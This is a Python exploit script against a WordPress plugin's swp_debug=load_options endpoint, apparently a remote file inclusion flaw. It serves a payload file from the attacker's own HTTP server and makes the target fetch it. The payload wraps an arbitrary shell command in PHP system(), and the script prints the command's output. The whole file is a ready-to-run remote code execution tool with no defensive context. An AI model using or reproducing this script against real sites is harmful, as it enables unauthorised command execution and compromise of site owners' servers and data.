#!/usr/bin/python

import argparse
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
import requests
from bs4 import BeautifulSoup
import os
import time


# Surpress HTTP server logging
class quietServer(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass


class Exploit:
    def __init__(self, target, lhost, lport, command):
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.command = command
        self.vulnpath = '/wp-admin/admin-post.php?swp_debug=load_options&swp_url='
        self.localpath = 'http://' + self.lhost + ':' + self.lport + '/payload.txt'

        # Run the HTTP server in its own thread
        # By doing so the execution of the exploit does not get blocked by running the HTTP server
        self.HTTP_thread = threading.Thread(target=self.start_HTTP_server)
        self.HTTP_thread.start()
        time.sleep(5)
        print(f"[+] Started HTTP server on port {self.lport}")

        self.create_payload()
        self.exploit()

    # HTTP server to provide the payload
    def start_HTTP_server(self):
        try:
            self.httpd = HTTPServer(
                ('', int(self.lport)), quietServer)
            self.httpd.serve_forever()
        except OSError as error:
            self.httpd.shutdown()
            print(
                f"[-] Unable to start HTTP Server on port {self.lport}\n", error)
            os._exit(0)
        except Exception:
            raise

    # Create a file containing the payload
    def create_payload(self):
        try:
            with open('payload.txt', 'w') as payload:
                payload.write(f'<pre>system(\'{self.command}\')</pre>')
                print("[+] Payload created successfully")
        except OSError as error:
            print(f"[-] Unable to create the payload\n", error)
        except Exception:
            raise

    def exploit(self):
        try:
            response = requests.get(
                self.target + self.vulnpath + self.localpath)
        except Exception:
            raise

        print("[+] Target seems vulnerable")
        print("[+] Exploiting...\n")
        soup = str(BeautifulSoup(response.content, 'html.parser'))

        # Split unnecessary HTLM from the response
        soup = soup.split('<!DOCTYPE html>')
        print(soup[0])

        os._exit(0)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target',
                        type=str, required=True, help='Target URL or IP')
    parser.add_argument('-l', '--lhost', dest='lhost',
                        type=str, required=True, help='Local IP adress')
    parser.add_argument('-p', '--lport', dest='lport',
                        type=str, required=True, help='Local HTTP server port')
    parser.add_argument('-c', '--command', dest='command',
                        type=str, required=True, help='Command to execute on the target')
    args = parser.parse_args()

    exploit = Exploit(args.target, args.lhost, args.lport, args.command)


if __name__ == "__main__":
    main()
